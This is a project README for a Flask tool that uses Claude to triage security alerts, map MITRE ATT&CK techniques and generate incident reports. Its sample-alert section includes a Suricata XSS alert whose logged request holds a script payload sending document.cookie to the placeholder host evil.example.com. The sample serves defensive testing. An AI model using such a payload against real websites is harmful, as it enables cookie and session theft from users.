# AI SOC Analyst

[![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=flat&logo=python&logoColor=white)](https://python.org)
[![Flask](https://img.shields.io/badge/Flask-3.0-000000?style=flat&logo=flask&logoColor=white)](https://flask.palletsprojects.com)
[![Claude](https://img.shields.io/badge/Claude-claude--sonnet--4--6-CC785C?style=flat&logo=anthropic&logoColor=white)](https://anthropic.com)
[![SQLite](https://img.shields.io/badge/SQLite-3-003B57?style=flat&logo=sqlite&logoColor=white)](https://sqlite.org)
[![Bootstrap](https://img.shields.io/badge/Bootstrap-5.3-7952B3?style=flat&logo=bootstrap&logoColor=white)](https://getbootstrap.com)
[![License](https://img.shields.io/badge/License-MIT-green?style=flat)](LICENSE)

> An AI-powered Security Operations Center (SOC) analyst assistant that automatically triages raw security alerts using Claude AI — classifying threats, mapping MITRE ATT&CK techniques, and generating professional incident reports in seconds.

![AI SOC Analyst Dashboard](https://via.placeholder.com/1200x600/050508/00e5ff?text=AI+SOC+Analyst+Dashboard+Screenshot)

---

## Overview

AI SOC Analyst is a web-based triage platform for security operations teams. A SOC analyst pastes a raw log, SIEM alert, or network event, and the AI automatically:

- **Classifies** it as True Positive or False Positive
- **Assigns severity** (Critical / High / Medium / Low)
- **Maps MITRE ATT&CK** techniques to the observed behavior
- **Recommends containment steps** for immediate response
- **Generates a full incident report** following professional SOC standards

All analyses are stored in SQLite with a history panel, statistics dashboard, and export capability.

---

## Features

| Feature | Description |
|---|---|
| **AI Triage Engine** | Claude Sonnet analyzes alerts with expert SOC analyst context |
| **MITRE ATT&CK Mapping** | Automatically identifies technique IDs and names |
| **Incident Report Generation** | Full professional report with Executive Summary, IOCs, Timeline |
| **Alert Classification** | True Positive / False Positive with confidence score (0–100%) |
| **Severity Scoring** | Critical / High / Medium / Low severity assignment |
| **Alert History** | SQLite-backed history of all analyzed alerts |
| **Statistics Dashboard** | TP/FP ratio, severity breakdown, top MITRE techniques |
| **Export Reports** | Download full incident report as `.txt` |
| **Sample Alerts** | Built-in sample alerts for testing (SSH, XSS, PrivEsc, DNS) |
| **Dark SOC Theme** | Professional dark UI with cyan accents, monospace fonts |
| **Responsive Design** | Works on desktop and mobile |

---

## Tech Stack

- **Backend:** Python 3.10+, Flask 3.0
- **AI Engine:** Anthropic Claude API (`claude-sonnet-4-6`)
- **Database:** SQLite (via Python `sqlite3`)
- **Frontend:** HTML5, CSS3, JavaScript (ES6+)
- **UI Framework:** Bootstrap 5.3
- **Icons:** Bootstrap Icons
- **Configuration:** `python-dotenv`

---

## Installation

### Prerequisites

- Python 3.10 or higher
- An [Anthropic API key](https://console.anthropic.com/)

### 1. Clone the repository

```bash
git clone https://github.com/dhruvshah-cyber/ai-soc-analyst.git
cd ai-soc-analyst
```

### 2. Create a virtual environment

```bash
python -m venv venv

# Linux / macOS
source venv/bin/activate

# Windows
venv\Scripts\activate
```

### 3. Install dependencies

```bash
pip install -r requirements.txt
```

### 4. Configure your API key

```bash
cp .env.example .env
```

Edit `.env` and add your Anthropic API key:

```env
ANTHROPIC_API_KEY=sk-ant-api03-...your-key-here...
```

> **Never commit your `.env` file.** It is already listed in `.gitignore`.

### 5. Run the application

```bash
python app.py
```

Open your browser at: **http://localhost:5000**

---

## Usage

### Analyzing an Alert

1. Open the dashboard at `http://localhost:5000`
2. Paste your raw security alert, SIEM event, or log snippet in the **Alert Triage Console**
3. Click **Analyze with AI** (or press `Ctrl+Enter`)
4. The AI will process your alert and display:
   - Classification (True/False Positive) with confidence score
   - Severity level
   - MITRE ATT&CK technique mapping
   - Containment steps
   - Full incident report
5. Click **Export .txt** to download the report
6. Click **Full Page** to view the dedicated incident report page

### Loading Sample Alerts

Use the **Load Sample Alert** dropdown to test with pre-built scenarios:
- SSH Brute Force
- Suricata XSS Detection
- Windows Privilege Escalation (Event 4672)
- DNS Beaconing / C2 Communication

---

## Sample Alert Inputs

### SSH Brute Force

```
Jan 15 03:42:08 prod-server sshd[8821]: Failed password for root from 203.0.113.47 port 54321 ssh2
Jan 15 03:42:09 prod-server sshd[8821]: Failed password for root from 203.0.113.47 port 54322 ssh2
Jan 15 03:42:10 prod-server sshd[8821]: Failed password for root from 203.0.113.47 port 54323 ssh2
Jan 15 03:42:11 prod-server sshd[8821]: error: maximum authentication attempts exceeded for root from 203.0.113.47
```

**Expected Output:**
- Classification: True Positive
- Severity: High
- MITRE: T1110 — Brute Force
- Containment: Block source IP, enable account lockout, review auth logs

---

### Suricata XSS Alert

```
[**] [1:2101441:7] ET WEB_SPECIFIC_APPS Possible XSS Attempt via script tag [**]
[Classification: Web Application Attack] [Priority: 1]
03/15-14:22:31 10.0.1.55:49832 -> 192.168.10.20:80
GET /search?q=<script>document.location='http://evil.example.com/steal?c='+document.cookie</script>
```

**Expected Output:**
- Classification: True Positive
- Severity: High
- MITRE: T1059 — Command and Scripting Interpreter / T1071 — Application Layer Protocol
- Containment: Block source IP, patch XSS vulnerability, review WAF rules

---

### Windows Privilege Escalation (Event ID 4672)

```
Event ID: 4672 — Special Logon
Account: jsmith (standard user — no admin group membership)
Privileges Assigned: SeDebugPrivilege, SeImpersonatePrivilege, SeLoadDriverPrivilege
Computer: WORKSTATION-07.corp.local
```

**Expected Output:**
- Classification: True Positive
- Severity: Critical
- MITRE: T1068 — Exploitation for Privilege Escalation
- Containment: Isolate workstation, revoke privileges, forensic investigation

---

### DNS Beaconing / C2

```
[ALERT] SIEM Rule: DNS_BEACONING_PATTERN
Source Host  : WORKSTATION-12 (10.10.5.44)
Domain       : *.malware-c2.xyz
Requests/hr  : 60 (exactly 1/min — regular interval)
Entropy Score: HIGH (DGA suspected)
Threat Intel : malware-c2.xyz flagged by VirusTotal (47/72 engines)
```

**Expected Output:**
- Classification: True Positive
- Severity: Critical
- MITRE: T1071 — Application Layer Protocol / T1568 — Dynamic Resolution
- Containment: Isolate host, block domain at DNS/firewall, memory forensics

---

## MITRE ATT&CK Reference

| Technique ID | Name | Common In |
|---|---|---|
| T1110 | Brute Force | SSH, RDP, web login attacks |
| T1566 | Phishing | Email-based initial access |
| T1059 | Command and Scripting Interpreter | Web shells, XSS, macro execution |
| T1071 | Application Layer Protocol | C2 beaconing over DNS/HTTP |
| T1068 | Exploitation for Privilege Escalation | Windows privilege abuse |
| T1078 | Valid Accounts | Credential stuffing, account takeover |
| T1053 | Scheduled Task/Job | Persistence via cron/Task Scheduler |
| T1086 | PowerShell | Fileless malware, lateral movement |
| T1568 | Dynamic Resolution | DGA-based C2 communication |
| T1190 | Exploit Public-Facing Application | CVE exploitation, SQL injection |

---

## Project Structure

```
ai-soc-analyst/
├── app.py                  # Flask backend + Claude API integration
├── database.py             # SQLite database setup and queries
├── templates/
│   ├── index.html          # Main SOC dashboard
│   └── report.html         # Individual incident report page
├── static/
│   ├── style.css           # Dark SOC theme (CSS variables + components)
│   └── script.js           # Frontend JavaScript (fetch API, UI logic)
├── .env.example            # API key template
├── .gitignore              # Excludes .env and database files
├── requirements.txt        # Python dependencies
└── README.md               # This file
```

---

## API Endpoints

| Method | Endpoint | Description |
|---|---|---|
| `GET` | `/` | Main dashboard |
| `POST` | `/analyze` | Analyze alert with Claude AI |
| `GET` | `/report/<id>` | Full incident report page |
| `GET` | `/api/alerts` | JSON list of all alerts |
| `GET` | `/api/alert/<id>` | JSON for single alert |
| `GET` | `/api/stats` | JSON statistics |

---

## Skills Demonstrated

- **AI/LLM Integration** — Structured prompt engineering with Claude Sonnet API, JSON response parsing
- **Full-Stack Web Development** — Flask REST API, Jinja2 templating, fetch API, Bootstrap 5
- **Cybersecurity Domain Knowledge** — SIEM alert triage, MITRE ATT&CK framework, incident response
- **Database Design** — SQLite schema design, parameterized queries (SQL injection prevention)
- **Frontend Development** — Dark UI theming, responsive design, dynamic DOM manipulation
- **API Security** — Environment variable configuration, API error handling, input validation
- **Software Architecture** — Separation of concerns (routes / database / frontend)

---

## Security Notes

- API key is stored in `.env` — never in source code
- SQLite queries use parameterized inputs to prevent SQL injection
- User input is length-validated before being sent to the AI
- HTML output is properly escaped to prevent XSS in the history panel

---

## Legal Disclaimer

> This tool is intended for **authorized security testing, educational purposes, and legitimate security operations only**.
>
> Do not use this tool to analyze alerts or logs from systems you do not have explicit permission to access. The author assumes no liability for misuse. Always comply with applicable laws and your organization's security policies.

---

## Author

**Dhruv Shah**
- GitHub: [@dhruvshah-cyber](https://github.com/dhruvshah-cyber)

---

## License

MIT License — see [LICENSE](LICENSE) for details.
